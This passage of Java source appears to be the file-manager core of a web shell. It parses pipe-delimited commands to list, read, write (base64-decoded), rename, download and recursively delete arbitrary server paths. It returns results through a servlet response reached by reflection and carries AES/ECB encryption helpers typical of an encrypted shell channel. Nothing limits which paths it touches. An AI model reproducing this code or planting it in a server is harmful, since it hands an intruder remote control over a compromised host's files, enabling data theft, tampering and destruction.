import java.util.Date;

    String sanitizePath(String path) {
        if (path == null || path.isEmpty()) return "/";
        path = path.replaceAll("[\\u0000-\\u001F\\u007F]", "");
        boolean isWindows = path.matches("^[A-Za-z]:[/\\\\].*") || path.startsWith("\\\\");
        String sep = isWindows ? "\\" : "/";
        String wrongSep = isWindows ? "/" : "\\";
        path = path.replace(wrongSep, sep);
        String doubleSep = sep + sep;
        while (path.contains(doubleSep)) {
            path = path.replace(doubleSep, sep);
        }
        if (isWindows) {
            java.util.regex.Matcher m = java.util.regex.Pattern.compile("^([A-Za-z]:)(.*)$").matcher(path);
            if (m.find()) {
                String rest = m.group(2);
                while (rest.startsWith(sep)) rest = rest.substring(1);
                path = m.group(1) + sep + rest;
            }
            if (path.length() > 3 && path.endsWith(sep)) {
                path = path.substring(0, path.length() - 1);
            }
        } else {
            if (path.length() > 1 && path.endsWith(sep)) {
                path = path.substring(0, path.length() - 1);
            }
        }
        return path.isEmpty() ? sep : path;
    }

    String handleFileOp(String cmd) {
        if (cmd == null || cmd.isEmpty()) return "ERROR|Empty command";
        String[] parts = cmd.split("\\|", 3);
        String action = parts.length > 0 ? parts[0] : "";
        String path = parts.length > 1 ? sanitizePath(parts[1]) : "";
        String extra = parts.length > 2 ? parts[2] : "";
        if (path.isEmpty()) return "ERROR|Invalid path";
        try {
            if ("LIST".equals(action)) {
                return doList(path);
            } else if ("READ".equals(action)) {
                return doRead(path);
            } else if ("WRITE".equals(action)) {
                return doWrite(path, extra);
            } else if ("DELETE".equals(action)) {
                return doDelete(path);
            } else if ("MKDIR".equals(action)) {
                return doMkdir(path);
            } else if ("RENAME".equals(action)) {
                return doRename(path, extra);
            } else if ("DOWNLOAD".equals(action)) {
                return doDownload(path);
            } else {
                return "ERROR|Unknown action: " + action;
            }
        } catch (Exception e) {
            return "ERROR|" + e.getMessage();
        }
    }

    String doList(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            return "ERROR|Not a directory: " + path;
        }
        File[] files = dir.listFiles();
        if (files == null) {
            return "ERROR|Cannot list directory";
        }
        StringBuilder sb = new StringBuilder();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (File f : files) {
            String type = f.isDirectory() ? "DIR" : "FILE";
            long size = f.isDirectory() ? 0 : f.length();
            long time = f.lastModified();
            sb.append("[").append(type).append("]").append(f.getName()).append("|").append(size).append("|").append(time).append("|").append(sdf.format(new Date(time))).append("\n");
        }
        return sb.toString();
    }

    String doRead(String path) {
        File f = new File(path);
        System.out.println("[doRead] path=" + path + " exists=" + f.exists() + " isDir=" + f.isDirectory());
        if (!f.exists()) {
            return "ERROR|File not found: " + path;
        }
        if (f.isDirectory()) {
            return "ERROR|Path is a directory: " + path;
        }
        if (f.length() > 1024 * 1024) {
            return "ERROR|File too large (>1MB)";
        }
        try {
            byte[] bytes = Files.readAllBytes(f.toPath());
            String content = new String(bytes, StandardCharsets.UTF_8);
            return "OK|" + content;
        } catch (Exception e) {
            return "ERROR|" + e.getMessage();
        }
    }

    String doWrite(String path, String contentB64) {
        try {
            File target = new File(path);
            File parent = target.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }
            byte[] content = Base64.getDecoder().decode(contentB64);
            Files.write(target.toPath(), content);
            return "OK|File written";
        } catch (Exception e) {
            return "ERROR|" + e.getMessage();
        }
    }

    String doDelete(String path) {
        File f = new File(path);
        System.out.println("[doDelete] path=" + path + " exists=" + f.exists() + " isDir=" + f.isDirectory());
        if (!f.exists()) {
            return "ERROR|File not found: " + path;
        }
        if (deleteRecursive(f)) {
            return "OK|Deleted";
        } else {
            return "ERROR|Delete failed";
        }
    }

    boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (!deleteRecursive(child)) return false;
                }
            }
        }
        return f.delete();
    }

    String doMkdir(String path) {
        File f = new File(path);
        if (f.mkdirs()) {
            return "OK|Directory created";
        } else {
            return "ERROR|Create directory failed";
        }
    }

    String doRename(String path, String newName) {
        File f = new File(path);
        if (!f.exists()) {
            return "ERROR|File not found: " + path;
        }
        File parent = f.getParentFile();
        File dest = new File(parent, newName);
        if (f.renameTo(dest)) {
            return "OK|Renamed";
        } else {
            return "ERROR|Rename failed";
        }
    }

    String doDownload(String path) {
        File f = new File(path);
        System.out.println("[doDownload] path=" + path + " exists=" + f.exists() + " isDir=" + f.isDirectory());
        if (!f.exists()) {
            return "ERROR|File not found: " + path;
        }
        if (f.isDirectory()) {
            return "ERROR|Path is a directory: " + path;
        }
        try {
            byte[] bytes = Files.readAllBytes(f.toPath());
            return "OK|" + Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            return "ERROR|" + e.getMessage();
        }
    }

    void write(Object response, String data) throws Exception {
        Object writer = response.getClass()
                .getMethod("getWriter")
                .invoke(response);
        writer.getClass()
                .getMethod("write", String.class)
                .invoke(writer, data);
    }

    byte[] aesECB(byte[] data, byte[] key, int mode) {
        try {
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
            SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
            cipher.init(mode == 0 ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE, secretKeySpec);
            return cipher.doFinal(data);
        } catch (Exception e) {
            throw new RuntimeException("AES ECB error", e);
        }
    }

    String aesECB(String data, String key, int mode) {
        try {
            byte[] keyBytes = key.getBytes(StandardCharsets.UTF_8);
            if (mode == 0) {
                byte[] encrypted = aesECB(data.getBytes(StandardCharsets.UTF_8), keyBytes, 0);
                return Base64.getEncoder().encodeToString(encrypted);
            } else {
                byte[] decoded = Base64.getDecoder().decode(data);
                return new String(aesECB(decoded, keyBytes, 1), StandardCharsets.UTF_8);
            }
        } catch (Exception e) {
            return null;
        }
    }

    String generateRandom(int length) {
        String charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            int index = random.nextInt(charset.length());
            sb.append(charset.charAt(index));
        }
        return sb.toString();
    }
